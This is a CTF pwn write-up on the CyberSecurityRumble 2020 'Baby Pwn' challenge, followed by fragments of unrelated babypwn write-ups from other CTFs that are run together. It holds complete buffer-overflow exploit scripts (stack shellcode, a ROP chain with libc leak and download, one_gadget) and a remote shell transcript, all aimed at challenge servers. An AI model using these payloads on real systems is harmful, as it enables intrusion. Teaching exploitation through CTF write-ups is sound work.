# CyberSecurityRumble CTF 2020

## Baby Pwn

> 100 + 0 (65 solves)  
>  
> Never done any kind of binary exploitation before? This should get you
> started. Grab some gdb or radare, turn off **ASLR**, forget about stack
> canaries, and let the fun begin.  
>  
> `nc chal.cybersecurityrumble.de 1990`  
>  
> [files](baby-pwn-c84231024c5f62bf35ec0c201b3605ec.tar.xz)  

Tags: _pwn_ _x86-64_ _remote-shell_ _shellcode_ _bof_ _rop_

## Summary

The description pretty much gives it all away, this is going to be oldskool
pre-ASLR shellcoding--should be _fun_. BTW, Linux didn't have ASLR
[mainstream] until 2005, however it feels like it has been around forever.

The gamemasters have provided all the source, including Docker configs so that
you can precisely mirror the challenge service.

> **Update:** I discovered a minor error in my container build while exploring
> alternative solutions.  I am leaving the write up as is since this is the
> path I took, however I'll note the differences in errata at the end.

> **Update:** Added alternative solves at the end.  

## Analysis

### Checksec

```  
   Arch:     amd64-64-little  
   RELRO:    Partial RELRO  
   Stack:    No canary found  
   NX:       NX disabled  
   PIE:      PIE enabled  
   RWX:      Has RWX segments  
```

PIE and nothing else, however with ASLR disabled (assumed from the
description), does it really matter?

### Read the source

```c  
int check_user_hash(char* flag) {  
   unsigned char user_md5[MD5_DIGEST_LENGTH * 2 + 1];  
   unsigned char flag_md5[MD5_DIGEST_LENGTH];

   /* calculate MD5("CSR{...}") */  
   calc_string_md5(flag, flag_md5);

   /* read user input, convert to hexadecimal */  
   gets(user_md5);  
   hex_to_binary(user_md5, user_md5, strlen(user_md5));

   return memcmp(flag_md5, user_md5, MD5_DIGEST_LENGTH) ? 0 : 1;  
}  
```

`gets` with no stack canary provides an easy buffer overflow.

For analysis I prefer the output from Ghidra vs. the source:

```c  
ulong check_user_hash(char *param_1)  
{  
 size_t len;  
 ulong local_88;  
 ulong local_80;  
 ulong local_78;  
 ulong local_70;  
  
 MD5_Init((MD5_CTX *)&local_78);  
 len = strlen(param_1);  
 MD5_Update((MD5_CTX *)&local_78,param_1,len);  
 MD5_Final((uchar *)&local_88,(MD5_CTX *)&local_78);  
 gets((char *)(MD5_CTX *)&local_78);  
 len = strlen((char *)(MD5_CTX *)&local_78);  
 hex_to_binary((long)(MD5_CTX *)&local_78,(long)(MD5_CTX *)&local_78,len);  
 return (ulong)((local_80 ^ local_70 | local_88 ^ local_78) == 0);  
}  
```

All I'm interested in is the `gets` call with the parameter of `local_78`.
This tells me that the buffer is `0x78` bytes from the return address on the
stack.  No need to guess.

All we need now is a payload and an address.  But before that we need to look
at `hex_to_binary` since that is called and alters the stack on the way to
`ret`:

```c  
void hex_to_binary(char *in, unsigned char* out, size_t length) {  
   size_t i;  
   assert("length must be even" && (length % 2) == 0);  
   length /= 2;  
   for (i = 0; i < length; i++) {  
       out[i] = char_to_repr(in[i * 2]) << 4 | char_to_repr(in[i * 2 + 1]);  
   }  
}  
```

`hex_to_binary` is expecting an even number of chars validated by
`char_to_repr` (hex digits):

```c  
unsigned char char_to_repr(char in) {  
   if (in >= '0' && in <= '9')  
	return in - '0';  
   if (in >= 'a' && in <= 'f')  
	return in - 'a' + 0xa;  
   if (in >= 'A' && in <= 'F')  
	return in - 'A' + 0xa;  
   assert("not in hex digit range" && 0);  
}  
```

`hex_to_binary` loops through and updates `local_78` in place--best if our
shellcode is after this.

### Find the target address

> This is only one of many ways to solve this.  Without ASLR and the included
> Docker container, the address of the binary and libc should be consistent
> enabling ROP, one_gadget, etc...  However, the port number _is_ `1990`, so
> let's do this like it's the
> [90's](http://www.phrack.org/issues/49/14.html#article).

> For dev/test I did this in an Ubuntu 20.04 container, but for the target
> service, I had to build their Docker container.

After extracting the challenge files, just `cd` into the `baby-pwn-for-
download/docker` directory and type:

```bash  
$ docker build -t babypwn .  
Sending build context to Docker daemon  27.14kB  
...  
Successfully built a2b13660aa2c  
Successfully tagged babypwn:latest  
```

Then start with:

```bash  
docker run --rm -d -p 1990:6666 --name babypwn --privileged babypwn  
```

After that, get in the container and install some tools:

```bash  
$ docker exec -it babypwn /bin/bash  
# apt-get update && apt-get -qy install gdb python3 wget  
# wget -q -O- https://github.com/hugsy/gef/raw/master/scripts/gef.sh | sh  
```

From another terminal connect to port 1990, e.g.:

```bash  
nc localhost 1990  
```

You should receive:

```  
It's easy. Give me MD5($flag), get $flag in return.  
```

Now from the docker session type:

```bash  
# cd /home/ctf  
# gdb babypwn $(pidof babypwn)  
```

At this point we're in the middle of `gets` in the middle of
`check_user_hash`:

```gdb  
(gdb) disas check_user_hash  
Dump of assembler code for function check_user_hash:  
  0x0000555555555440 <+0>:      push   r12  
  0x0000555555555442 <+2>:      mov    r12,rdi  
  0x0000555555555445 <+5>:      push   rbp  
  0x0000555555555446 <+6>:      sub    rsp,0x78  
  0x000055555555544a <+10>:     lea    rbp,[rsp+0x10]  
  0x000055555555544f <+15>:     mov    rdi,rbp  
  0x0000555555555452 <+18>:     call   0x5555555550c0 <MD5_Init@plt>  
  0x0000555555555457 <+23>:     mov    rdi,r12  
  0x000055555555545a <+26>:     call   0x555555555080 <strlen@plt>  
  0x000055555555545f <+31>:     mov    rsi,r12  
  0x0000555555555462 <+34>:     mov    rdi,rbp  
  0x0000555555555465 <+37>:     mov    rdx,rax  
  0x0000555555555468 <+40>:     call   0x5555555550a0 <MD5_Update@plt>  
  0x000055555555546d <+45>:     mov    rsi,rbp  
  0x0000555555555470 <+48>:     mov    rdi,rsp  
  0x0000555555555473 <+51>:     call   0x555555555090 <MD5_Final@plt>  
  0x0000555555555478 <+56>:     mov    rdi,rbp  
  0x000055555555547b <+59>:     call   0x5555555550b0 <gets@plt>  
  0x0000555555555480 <+64>:     mov    rdi,rbp  
  0x0000555555555483 <+67>:     call   0x555555555080 <strlen@plt>  
  0x0000555555555488 <+72>:     mov    rsi,rbp  
  0x000055555555548b <+75>:     mov    rdi,rbp  
  0x000055555555548e <+78>:     mov    rdx,rax  
  0x0000555555555491 <+81>:     call   0x555555555360 <hex_to_binary>  
  0x0000555555555496 <+86>:     mov    rdx,QWORD PTR [rsp+0x8]  
  0x000055555555549b <+91>:     mov    rax,QWORD PTR [rsp]  
  0x000055555555549f <+95>:     xor    rdx,QWORD PTR [rsp+0x18]  
  0x00005555555554a4 <+100>:    xor    rax,QWORD PTR [rsp+0x10]  
  0x00005555555554a9 <+105>:    or     rdx,rax  
  0x00005555555554ac <+108>:    sete   al  
  0x00005555555554af <+111>:    add    rsp,0x78  
  0x00005555555554b3 <+115>:    movzx  eax,al  
  0x00005555555554b6 <+118>:    pop    rbp  
  0x00005555555554b7 <+119>:    pop    r12  
  0x00005555555554b9 <+121>:    ret  
End of assembler dump.  
```

Above, `gets` is at offset `+59`, so set a break point just after `gets`
(offset `+64`):

```gdb  
(gdb) b *check_user_hash+64  
(gdb) c  
```

From the other terminal (where `nc` is running) type `AAAA` and press return,
then back to the gdb session and dump the stack frame:

```gdb  
(gdb) telescope $rsp 18  
```

> Why 18?  It's the length of the stack frame in 8-byte words.  This can be
> computed from the start of the function:  
>  
> ```assembly  
> 00101440 41 54           PUSH       R12  
> 00101442 49 89 fc        MOV        R12,param_1  
> 00101445 55              PUSH       RBP  
> 00101446 48 83 ec 78     SUB        RSP,0x78  
> ```  
>  
> Two pushes and a `SUB` = `8 + 8 + 0x78 = 136`, then add 8 for the return
> address pushed from call for a total of 144 bytes.  `144 / 8 = 18`.

Output:

```gdb  
0x00007fffffffe720│+0x0000: 0x1be3e93037b0d224   ← $rsp  
0x00007fffffffe728│+0x0008: 0x65eb4ac4ed908384  
0x00007fffffffe730│+0x0010: 0x1be3e90041414141 ("AAAA"?)         ← $rax, $rbp  
0x00007fffffffe738│+0x0018: 0x65eb4ac4ed908384  
0x00007fffffffe740│+0x0020: 0x00000000000000f8  
0x00007fffffffe748│+0x0028: 0x0000000000000000  
0x00007fffffffe750│+0x0030: 0x0000000000000000  
0x00007fffffffe758│+0x0038: 0x0000000000000000  
0x00007fffffffe760│+0x0040: 0x0000000000000000  
0x00007fffffffe768│+0x0048: 0x0000000000000000  
0x00007fffffffe770│+0x0050: 0x0000000000000000  
0x00007fffffffe778│+0x0058: 0x0000000000000000  
0x00007fffffffe780│+0x0060: 0x0000000000000000  
0x00007fffffffe788│+0x0068: 0x0000000000000000  
0x00007fffffffe790│+0x0070: 0x0000000000000003  
0x00007fffffffe798│+0x0078: 0x0000000000000003  
0x00007fffffffe7a0│+0x0080: 0x00007fffffffe7b0  →  "CSR{this-is-not-the-real-
flag}\n"  
0x00007fffffffe7a8│+0x0088: 0x0000555555555176  →  <main+150> test eax, eax  
```

Line `+0x0088` is the return address (the `<main+150> test eax, eax` is also a
give away) and it is exactly `0x78` from line `+0x0010` (see our `AAAA`) as
expected.

So we should be able to write an even number of `A` (e.g. 6), followed by a
couple of nulls to terminate the string, followed by our payload plus padding
to line `+0x0088` where we would put in the address of our payload
`0x00007fffffffe738`.  And if you're wondering why this does not change, well,
it's because ASLR is disabled in their service startup script `babypwn_svc`:

```  
service babypwn  
{  
   type         = UNLISTED  
   protocol     = tcp  
   socket_type  = stream  
   port         = 6666  
   server       = /usr/bin/setarch  
   server_args  = x86_64 --addr-no-randomize /home/ctf/babypwn  
   user         = ctf  
   wait         = no  
   env          =
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin  
}  
```

`setarch $(uname -m) --addr-no-randomize` will execute the next parameter
passed to it without ASLR.

Traditionally, we'd setup a NOP sled just in case the stack is a little off,
even with ASLR disabled, its possible for other factors to have the stack not
exactly where expected (however for this challenge it appears to be as
predictable as it _gets_).

Before doing the math and building the longest possible sled we need to
consider the following just before the return is called:

```assembly  
001014af 48 83 c4 78     ADD        RSP,0x78  
001014b3 0f b6 c0        MOVZX      EAX,AL  
001014b6 5d              POP        RBP  
001014b7 41 5c           POP        R12  
```

The stack pointer is moved to `+0x0078` (see stack above), then the next two
values popped into `RBP` and `R12`.  So unless you want to lose the end of
your payload, say clear of the 16 bytes just before the return address.

## Exploit

```python  
#!/usr/bin/env python3

from pwn import *

context.log_level = 'INFO'  
context.log_file = 'remote.log'  
p = remote('chal.cybersecurityrumble.de', 1990)  
stack = 0x00007fffffffe738

# http://shell-storm.org/shellcode/files/shellcode-905.php  
shellcode  = b'\x6a\x42\x58\xfe\xc4\x48\x99\x52'  
shellcode += b'\x48\xbf\x2f\x62\x69\x6e\x2f\x2f'  
shellcode += b'\x73\x68\x57\x54\x5e\x49\x89\xd0'  
shellcode += b'\x49\x89\xd2\x0f\x05'  
shellcode += (8 - (len(shellcode) % 8)) *  b'\x90'

payload  = b''  
payload += 6 * b'A'  
payload += 2 * b'\0'  
payload += (0x78 - 8 - 16 - len(shellcode)) * b'\x90'  
payload += shellcode  
payload += (0x78 - len(payload)) * b'\x90'  
payload += p64(stack)

p.sendlineafter('return.\n',payload)  
p.interactive()  
```

`stack` is from the analysis above.

`shellcode` is just the first x86_64 Linux shell code I stumbled on from
[http://shell-storm.org](http://shell-storm.org) padded to be a multiple of 8
bytes (stack aligned).

The `payload` starts with an even number of `A`s followed by NULLs to fool
`hex_to_binary` and `char_to_repr` while keeping the total length to 8 (stack
aligned).

Appended to the `payload` is a NOP sled that will put the end of our shellcode
16 bytes from the return address to avoid getting popped off just before
return (see analysis).  The `0x78 - 8 - 16` is from the analysis above (`0x78`
bytes from return address `- 8` for the `hex_to_binary` bypass, followed by `-
16` for the 16 bytes to be avoided before the return address).

Appended next is the actual `shellcode`, then 16 bytes of anything really,
then the new return address (`stack`).

That's it.

Output:

```bash  
# ./exploit.py  
[+] Opening connection to chal.cybersecurityrumble.de on port 1990: Done  
[*] Switching to interactive mode  
$ id  
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)  
$ ls -l  
total 52  
lrwxrwxrwx   1 root root    7 Oct  8 01:31 bin -> usr/bin  
drwxr-xr-x   2 root root 4096 Apr 15  2020 boot  
drwxr-xr-x   5 root root  340 Oct 30 18:36 dev  
drwxr-xr-x   1 root root 4096 Oct 30 18:36 etc  
-rw-r--r--   1 root root   45 Oct 30 16:07 flag.txt  
drwxr-xr-x   1 root root 4096 Oct 30 18:36 home  
lrwxrwxrwx   1 root root    7 Oct  8 01:31 lib -> usr/lib  
lrwxrwxrwx   1 root root    9 Oct  8 01:31 lib32 -> usr/lib32  
lrwxrwxrwx   1 root root    9 Oct  8 01:31 lib64 -> usr/lib64  
lrwxrwxrwx   1 root root   10 Oct  8 01:31 libx32 -> usr/libx32  
drwxr-xr-x   2 root root 4096 Oct  8 01:31 media  
drwxr-xr-x   2 root root 4096 Oct  8 01:31 mnt  
drwxr-xr-x   2 root root 4096 Oct  8 01:31 opt  
dr-xr-xr-x 310 root root    0 Oct 30 18:36 proc  
drwx------   2 root root 4096 Oct  8 01:34 root  
drwxr-xr-x   1 root root 4096 Oct 23 17:32 run  
lrwxrwxrwx   1 root root    8 Oct  8 01:31 sbin -> usr/sbin  
drwxr-xr-x   2 root root 4096 Oct  8 01:31 srv  
dr-xr-xr-x  13 root root    0 Oct 30 23:13 sys  
drwxrwxrwt   1 root root 4096 Oct 30 18:35 tmp  
drwxr-xr-x   1 root root 4096 Oct  8 01:31 usr  
drwxr-xr-x   1 root root 4096 Oct  8 01:34 var  
$ cat flag.txt  
CSR{back-in-1990-life-must-have-been-easier}  
```

## Errata

The challenge Dockerfile `FROM` statement pulls `ubuntu:latest`, however if
you already have something labeled as `ubuntu:latest` in your local repo, then
that is used instead.  In my case that was based on 18.04
(`libc6_2.27-3ubuntu1_amd64.so` vs. `libc6_2.31-0ubuntu9_amd64.so` from the
challenge server).  The net effect was a stack address that was off by `0x10`,
but then that's what NOP sleds were designed to help with, so in the end, no
problem.

My advice to CTF authors: be specific.

### Find the target address (redo)

First, `docker rmi ubuntu:latest`, just in case.

The stack frame should now be:

```  
0x00007fffffffe710│+0x0000: 0x1be3e93037b0d224   ← $rsp  
0x00007fffffffe718│+0x0008: 0x65eb4ac4ed908384  
0x00007fffffffe720│+0x0010: 0x1be3e90041414141 ("AAAA"?)         ← $rax, $rbp,
$r8  
0x00007fffffffe728│+0x0018: 0x65eb4ac4ed908384  
0x00007fffffffe730│+0x0020: 0x00000000000000f8  
0x00007fffffffe738│+0x0028: 0x0000000000000000  
0x00007fffffffe740│+0x0030: 0x0000000000000000  
0x00007fffffffe748│+0x0038: 0x0000000000000000  
0x00007fffffffe750│+0x0040: 0x0000000000000000  
0x00007fffffffe758│+0x0048: 0x0000000000000000  
0x00007fffffffe760│+0x0050: 0x0000000000000000  
0x00007fffffffe768│+0x0058: 0x0000000000000000  
0x00007fffffffe770│+0x0060: 0x0000000000000000  
0x00007fffffffe778│+0x0068: 0x0000000000000000  
0x00007fffffffe780│+0x0070: 0x00007fffffffe7a0  →  "CSR{this-is-not-the-real-
flag}\n"  
0x00007fffffffe788│+0x0078: 0x0000000000000003  
0x00007fffffffe790│+0x0080: 0x00007fffffffe7a0  →  "CSR{this-is-not-the-real-
flag}\n"  
0x00007fffffffe798│+0x0088: 0x0000555555555176  →  <main+150> test eax, eax  
```

This is translated `-0x10` from the write up that incorrectly used Ubuntu
18.04 (libc 2.27).  The method remains unchanged.  

## Alternative Solutions

### Shellcode after return address (very 90s)

This is closer to 90's buffer overflow/shellcode exploits.  I initially went
with the shellcode in the stack frame out of habit--many CTFs use `fgets` or
`read` limiting the number of bytes.  But this is all 90s, all `gets`, so
putting after the return address should have been the obvious way to do this:

```python  
#!/usr/bin/env python3

from pwn import *

context.arch = 'x86_64'  
context.log_level = 'INFO'  
context.log_file = 'remote.log'  
p = remote('chal.cybersecurityrumble.de', 1990)  
stack = 0x00007fffffffe7a0

payload  = 2 * b'A'  
payload += (0x78 - len(payload)) * b'\0'  
payload += p64(stack)  
payload += asm(shellcraft.sh())

p.sendlineafter('return.\n',payload)  
p.interactive()  
```

The `stack` value (`0x00007fffffffe7a0`) is based on the stack frame above
(see Errata), and is just below the return address `0x00007fffffffe798`.

### ROP (post ASLR world)

Although compiled with PIE enabled, the challenge server launches with ASLR
disabled, so we get the base address for free and can use ROP:

```python  
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./babypwn')  
context.log_level = 'INFO'  
context.log_file = 'remote.log'  
libc_index = 0  
offset = 0x78

if binary.pie:  
   # need leak or assume no ASLR  
   binary.address = 0x0000555555554000  
```

All we need is the stack frame offset (see analysis section above), and the
base process address.  Since ASLR is disabled we know that it'll be
`0x0000555555554000`.

No brittle stack address info required.

```python  
while True:  
   p = remote('chal.cybersecurityrumble.de', 1990)

   rop = ROP([binary])  
   pop_rdi = rop.find_gadget(['pop rdi','ret'])[0]

   payload  = 2 * b'A'  
   payload += (offset - len(payload)) * b'\0'  
   payload += p64(pop_rdi)  
   payload += p64(binary.got.puts)  
   payload += p64(binary.plt.puts)  
   payload += p64(binary.sym.main)

   p.sendlineafter('return.\n',payload)  
   _ = p.recv(6)  
   puts = u64(_ + b'\0\0')  
log.info('puts: ' + hex(puts))  
```

This is basic ROP 101, use `pop rdi` and have `puts` _put_ itself out there,
then circle back to `main` for a second pass.

This is all enclosed in a while loop is for finding libc.  Although we can get
it from the container, with many CTF challenges that is not an option.  I've
been using this to lazily just find the correct libc:

```python  
   import requests  
   r = requests.post('https://libc.rip/api/find', json =
{'symbols':{'puts':hex(puts)[-3:]}})  
   while True:  
       libc_url = r.json()[libc_index]['download_url']  
       if context.arch in libc_url:  
           break  
       libc_index += 1  
log.info('libc_url: ' + libc_url)  
   libc_file = libc_url.split('/')[-1:][0]  
   if not os.path.exists(libc_file):  
log.info('getting: ' + libc_url)  
       r = requests.get(libc_url, allow_redirects=True)  
       open(libc_file,'wb').write(r.content)  
```

This code attempts to find and download the matching libc based on arch and
the last three nibbles of the `puts` function.

```python  
   libc = ELF(libc_file)  
   libc.address = puts - libc.sym.puts  
log.info('libc.address: ' + hex(libc.address))

   payload  = 2 * b'A'  
   payload += (offset - len(payload)) * b'\0'  
   payload += p64(pop_rdi + 1)  
   payload += p64(pop_rdi)  
   payload += p64(libc.search(b'/bin/sh').__next__())  
   payload += p64(libc.sym.system)

   p.sendlineafter('return.\n',payload)

   try:  
       p.sendline('echo shell')  
       if b'shell' in p.recvline():  
           p.interactive()  
           break  
   except:  
       libc_index += 1  
       p.close()  
```

The candidate libc is used to complete the second pass and get a shell,
however if this fails, the next libc candidate will be tested.

If all libc candidates are exhausted, then this will just error out.  It's
most likely not an issue with libc but exploit code.

Output:

```bash  
# ./exploit3.py  
[*] '/pwd/datajerk/cybersecurityrumblectf2020/babypwn/babypwn'  
   Arch:     amd64-64-little  
   RELRO:    Partial RELRO  
   Stack:    No canary found  
   NX:       NX disabled  
   PIE:      PIE enabled  
   RWX:      Has RWX segments  
[+] Opening connection to chal.cybersecurityrumble.de on port 1990: Done  
[*] Loaded 23 cached gadgets for './babypwn'  
[*] puts: 0x7ffff7af25a0  
[*] libc_url: https://libc.rip/download/libc6_2.31-0ubuntu9_amd64.so  
[*] getting: https://libc.rip/download/libc6_2.31-0ubuntu9_amd64.so  
[*]
'/pwd/datajerk/cybersecurityrumblectf2020/babypwn/libc6_2.31-0ubuntu9_amd64.so'  
   Arch:     amd64-64-little  
   RELRO:    Partial RELRO  
   Stack:    Canary found  
   NX:       NX enabled  
   PIE:      PIE enabled  
[*] libc.address: 0x7ffff7a6b000  
[*] Switching to interactive mode  
$ id  
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)  
$ cat flag.txt  
CSR{back-in-1990-life-must-have-been-easier}  
```

### one_gadget

Well, since we know the version of libc and it's address, we might as well see
if `one_gadget` will work:

```bash  
# one_gadget libc6_2.31-0ubuntu9_amd64.so  
0xe6ce3 execve("/bin/sh", r10, r12)  
constraints:  
 [r10] == NULL || r10 == NULL  
 [r12] == NULL || r12 == NULL

0xe6ce6 execve("/bin/sh", r10, rdx)  
constraints:  
 [r10] == NULL || r10 == NULL  
 [rdx] == NULL || rdx == NULL

0xe6ce9 execve("/bin/sh", rsi, rdx)  
constraints:  
 [rsi] == NULL || rsi == NULL  
 [rdx] == NULL || rdx == NULL  
```

This, does not work:

```python  
#!/usr/bin/env python3

from pwn import *

context.arch = 'x86_64'  
context.log_level = 'INFO'  
context.log_file = 'remote.log'  
p = remote('chal.cybersecurityrumble.de', 1990)

libc = ELF('./libc6_2.31-0ubuntu9_amd64.so')  
libc.symbols['gadget'] = [0xe6ce3, 0xe6ce6, 0xe6ce9][2]  
libc.address = 0x7ffff7a6b000

payload  = 2 * b'A'  
payload += (0x78 - len(payload)) * b'\0'  
payload += p64(libc.sym.gadget)

p.sendlineafter('return.\n',payload)  
p.interactive()  
```

I tested all three.  However, this did work with an Ubuntu 18.04 container and
libc 2.27.  So I'll leave it here and an example for the cases where it may
work.  

Original writeup (https://github.com/datajerk/ctf-write-
ups/tree/master/cybersecurityrumblectf2020/babypwn).input a long string to get flag  
[wp](http://note.taqini.space/#/ctf/HackZoneVIIICTF-2020/?id=babypwn)

Original writeup (http://taqini.space/2020/04/12/HackZone-VIII-CTF-pwn-
writeup/#More).https://www.pwndiary.com/write-ups/p-w-n-ctf-2018-babypwn-write-up-pwn115/

Original writeup (https://www.pwndiary.com/write-ups/p-w-n-ctf-2018-babypwn-
write-up-pwn115/).https://brycec.me/posts/corctf_2022_challenges#babypwn

Original writeup (https://brycec.me/posts/corctf_2022_challenges#babypwn).We were given a binary file and it source code.

```  
#include <stdio.h>  
#include <unistd.h>

int main() {  
  setbuf(stdout, NULL);

  char username[512];

  printf("You shell play a game against @gehaxelt! Win it to get
./flag.txt!\n");  
  printf("Your game slot is at: %p\n", username);  
  printf("What's your name?\n");  
  read(1, username, 1024);  
  printf("Ok, it's your turn, %s!\n", username);  
  printf("You lost! Sorry :-(\n");

  return 0;  
}  
```

The program will leak the stack address by printing it using the printf() with
“%p” format (it will print the address of the username variable). Then, the
program will ask the user to input data using the read() function with 1024
bytes as it maximal input size, and it will store the data into the username
variable. However, since the variable ‘username’ can only hold data up to 512
bytes, this results in a buffer overflow vulnerability.

Due to the NX protection being disabled (which means the stack has permission
rwx), we can inject a shellcode into the payload to gain a shell. To obtain
the shellcode, simply overwrite the saved return instruction pointer (RIP)
with the address of the ‘username’ variable using a Buffer Overflow.

Solver:

```  
#!/usr/bin/env python3  
# -*- coding: utf-8 -*-  
from pwn import *  
from os import path  
import sys

# ==========================[ Information  
DIR = path.dirname(path.abspath(__file__))  
EXECUTABLE = "/babypwn"  
TARGET = DIR + EXECUTABLE  
HOST, PORT = "52.59.124.14", 10020  
REMOTE, LOCAL = False, False

# ==========================[ Tools  
elf = ELF(TARGET)  
elfROP = ROP(elf)

# ==========================[ Configuration  
context.update(  
   arch=["i386", "amd64", "aarch64"][1],  
   endian="little",  
   os="linux",  
   log_level = ['debug', 'info', 'warn'][2],  
   terminal = ['tmux', 'split-window', '-h'],  
)

# ==========================[ Exploit

def exploit(io, libc=null):  
   if LOCAL==True:  
       #raw_input("Fire GDB!")  
       if len(sys.argv) > 1 and sys.argv[1] == "d":  
           choosen_gdb = [  
               "source /home/mydata/tools/gdb/gdb-pwndbg/gdbinit.py",     # 0 - pwndbg  
               "source /home/mydata/tools/gdb/gdb-peda/peda.py",          # 1 - peda  
               "source /home/mydata/tools/gdb/gdb-gef/.gdbinit-gef.py"    # 2 - gef  
               ][0]  
           cmd = choosen_gdb + """  
           b *main+142  
           """  
           gdb.attach(io, gdbscript=cmd)

   io.recvuntil(b"Your game slot is at: ")  
   LEAKED_STACK = int(io.recvuntil(b"\n", drop=True).decode(), 16)  
   print("LEAKED_STACK                 :", hex(LEAKED_STACK))

   RIP_OFFSET = 0x200+8 # sub rsp, 0x200 (+8 to overwrite rbp)  
   p = b""  
   p += asm(shellcraft.sh()).ljust(RIP_OFFSET)  
   p += p64(LEAKED_STACK)  
   io.send(p.ljust(1024, b"\x00")) # 1024 (the max input size), from: read(1,
username, 1024);

   io.interactive()

if __name__ == "__main__":  
   io, libc = null, null

   if args.REMOTE:  
       REMOTE = True  
       io = remote(HOST, PORT)  
       # libc = ELF("___")  
  
   else:  
       LOCAL = True  
       io = process(  
           [TARGET, ],  
           env={  
           #     "LD_PRELOAD":DIR+"/___",  
           #     "LD_LIBRARY_PATH":DIR+"/___",  
           },  
       )  
       # libc = ELF("___")  
   exploit(io, libc)  
		```

Original writeup (https://hackmd.io/@vidner/nullcon-sksd#Babypwn-pwn).Exploit a signedness and a format string vulnerability to:

* Leak a libc address and calculate the libc base address.  
* Overwrite the return address with the address of entry0, which will simply start the program once again after we received the leak.  
* Calculate the address of the a one gadget using the received leak.  
* Overwrite the return address with the address of the one gadget.

Original writeup (https://devel0pment.de/?p=1191).